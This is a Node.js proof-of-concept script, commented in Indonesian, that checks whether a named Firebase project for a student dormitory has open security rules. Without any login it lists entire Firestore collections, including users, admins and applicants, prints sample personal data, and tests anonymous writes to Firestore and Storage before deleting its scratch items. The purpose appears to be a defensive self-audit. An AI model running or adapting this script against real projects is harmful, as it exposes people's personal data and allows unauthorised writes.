// ============================================================
// PoC: membuktikan rules yang terbuka bisa "dibobol" tanpa login.
// ------------------------------------------------------------
// Script ini TIDAK memakai kredensial apa pun — hanya apiKey publik
// yang sama seperti yang tertanam di bundle website (src/firebase.js).
// Jadi apa pun yang berhasil dibaca/ditulis di sini = bisa dilakukan
// oleh pengunjung anonim biasa.
//
// Sifat: NON-DESTRUKTIF.
//   - Membaca (count + sample) collection sensitif.
//   - Uji TULIS hanya ke collection sekali-pakai "_poc_open_rules",
//     lalu dokumennya langsung dihapus.
//   - Uji tulis Storage ke file sekali-pakai, lalu langsung dihapus.
//
// Jalankan:
//   node scripts/poc-open-rules.mjs
// ============================================================

const PROJECT_ID = "asrama-ipb-sukasari";
// apiKey publik (sama dengan yang ada di src/firebase.js & bundle frontend).
const API_KEY = "AIzaSyAI7DAqPqKvIDTSJi60mzrB3N6atygMpBw";
const BUCKET = "asrama-ipb-sukasari.firebasestorage.app";

const FS_BASE = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents`;
const ST_BASE = `https://firebasestorage.googleapis.com/v0/b/${BUCKET}/o`;

const SENSITIVE_COLLECTIONS = [
  "berita",
  "alumni",
  "siteImages",
  "users",
  "admins",
  "bakalCalonPenghuni",
];

const SCRATCH_COLLECTION = "_poc_open_rules";
const SCRATCH_DOC_ID = "poc-test";
const SCRATCH_STORAGE_PATH = `_poc_open_rules/proof-${Date.now()}.txt`;

const ok = (s) => `\x1b[32m${s}\x1b[0m`;
const bad = (s) => `\x1b[31m${s}\x1b[0m`;
const dim = (s) => `\x1b[90m${s}\x1b[0m`;
const bold = (s) => `\x1b[1m${s}\x1b[0m`;

// ---- Helper decode Firestore REST ----
function decodeValue(v) {
  if (!v) return null;
  if ("stringValue" in v) return v.stringValue;
  if ("integerValue" in v) return Number(v.integerValue);
  if ("doubleValue" in v) return v.doubleValue;
  if ("booleanValue" in v) return v.booleanValue;
  if ("timestampValue" in v) return v.timestampValue;
  if ("nullValue" in v) return null;
  if ("mapValue" in v) return decodeFields(v.mapValue.fields);
  if ("arrayValue" in v) return (v.arrayValue.values || []).map(decodeValue);
  return v;
}
function decodeFields(fields) {
  const out = {};
  for (const [k, val] of Object.entries(fields || {})) out[k] = decodeValue(val);
  return out;
}
function toFields(obj) {
  const fields = {};
  for (const [k, val] of Object.entries(obj)) {
    if (typeof val === "string") fields[k] = { stringValue: val };
    else if (typeof val === "number") fields[k] = { integerValue: String(val) };
    else if (typeof val === "boolean") fields[k] = { booleanValue: val };
  }
  return fields;
}

// ---- Baca seluruh dokumen sebuah collection (tanpa auth) ----
async function listCollection(coll) {
  const docs = [];
  let pageToken = "";
  do {
    const url =
      `${FS_BASE}/${coll}?key=${API_KEY}&pageSize=300` +
      (pageToken ? `&pageToken=${encodeURIComponent(pageToken)}` : "");
    const res = await fetch(url);
    const json = await res.json();
    if (json.error) return { error: json.error, docs };
    for (const d of json.documents || []) {
      docs.push({
        id: d.name.split("/").pop(),
        data: decodeFields(d.fields),
      });
    }
    pageToken = json.nextPageToken || "";
  } while (pageToken);
  return { docs };
}

async function upsertDoc(coll, id, data) {
  const url = `${FS_BASE}/${coll}/${id}?key=${API_KEY}`;
  const res = await fetch(url, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ fields: toFields(data) }),
  });
  return res.status;
}

async function deleteDoc(coll, id) {
  const res = await fetch(`${FS_BASE}/${coll}/${id}?key=${API_KEY}`, {
    method: "DELETE",
  });
  return res.status;
}

// ---- Storage (tanpa auth) ----
async function storageUpload(path, content) {
  const res = await fetch(`${ST_BASE}?name=${encodeURIComponent(path)}`, {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: content,
  });
  return res.status;
}
async function storageDelete(path) {
  const res = await fetch(`${ST_BASE}/${encodeURIComponent(path)}`, {
    method: "DELETE",
  });
  return res.status;
}

async function main() {
  console.log(bold("\n=== PoC: akses tanpa login (anonymous) ==="));
  console.log(dim(`Project : ${PROJECT_ID}`));
  console.log(dim(`Auth    : TIDAK ADA token / login (murni apiKey publik)\n`));

  console.log(bold("1) BACA data (harusnya ditolak bila rules benar)"));
  let readBreach = 0;
  for (const coll of SENSITIVE_COLLECTIONS) {
    const { docs, error } = await listCollection(coll);
    if (error) {
      console.log(`  ${bad("GAGAL")}  ${coll.padEnd(20)} ${dim(error.status + " " + error.message)}`);
      continue;
    }
    readBreach++;
    const sample = docs[0]?.data || {};
    const keys = Object.keys(sample).slice(0, 6).join(", ");
    console.log(`  ${ok("BOBOL")}  ${coll.padEnd(20)} ${bold(docs.length + " dokumen")} ${dim("| field: " + (keys || "-"))}`);
    if (coll === "bakalCalonPenghuni" && docs[0]) {
      const d = docs[0].data;
      const pii = {
        namaLengkap: d.namaLengkap,
        email: d.email,
        nomorWhatsapp: d.nomorWhatsapp,
        tanggalLahir: d.tanggalLahir,
      };
      console.log(dim(`         contoh PII: ${JSON.stringify(pii)}`));
    }
    if (coll === "users" && docs[0]) {
      const d = docs[0].data;
      console.log(dim(`         contoh user: ${JSON.stringify({ nama: d.nama || d.name, email: d.email, isAdmin: d.isAdmin })}`));
    }
  }

  console.log(bold("\n2) TULIS data Firestore (di collection sekali-pakai)"));
  const wStatus = await upsertDoc(SCRATCH_COLLECTION, SCRATCH_DOC_ID, {
    proof: "ditulis tanpa login",
    at: new Date().toISOString(),
  });
  if (wStatus >= 200 && wStatus < 300) {
    console.log(`  ${ok("BOBOL")}  create/update ${SCRATCH_COLLECTION}/${SCRATCH_DOC_ID} -> HTTP ${wStatus}`);
    const dStatus = await deleteDoc(SCRATCH_COLLECTION, SCRATCH_DOC_ID);
    console.log(`  ${dim("bersih")} hapus dokumen uji -> HTTP ${dStatus}`);
  } else {
    console.log(`  ${bad("GAGAL")}  tulis -> HTTP ${wStatus}`);
  }

  console.log(bold("\n3) TULIS file ke Storage (file sekali-pakai)"));
  const upStatus = await storageUpload(SCRATCH_STORAGE_PATH, "proof tanpa login");
  if (upStatus >= 200 && upStatus < 300) {
    console.log(`  ${ok("BOBOL")}  upload ${SCRATCH_STORAGE_PATH} -> HTTP ${upStatus}`);
    const delStatus = await storageDelete(SCRATCH_STORAGE_PATH);
    console.log(`  ${dim("bersih")} hapus file uji -> HTTP ${delStatus}`);
  } else {
    console.log(`  ${bad("GAGAL")}  upload -> HTTP ${upStatus}`);
  }

  console.log(
    bold("\n=== Kesimpulan ===") +
      `\nCollection terbaca tanpa login: ${readBreach}/${SENSITIVE_COLLECTIONS.length}` +
      `\nJika angka > 0, rules WAJIB dipulihkan: ` +
      dim("cp rules-backup/*.rules . && npx firebase deploy --only firestore:rules,storage\n")
  );
}

main().catch((e) => {
  console.error(bad("\nGagal menjalankan PoC:"), e?.message || e);
  process.exit(1);
});
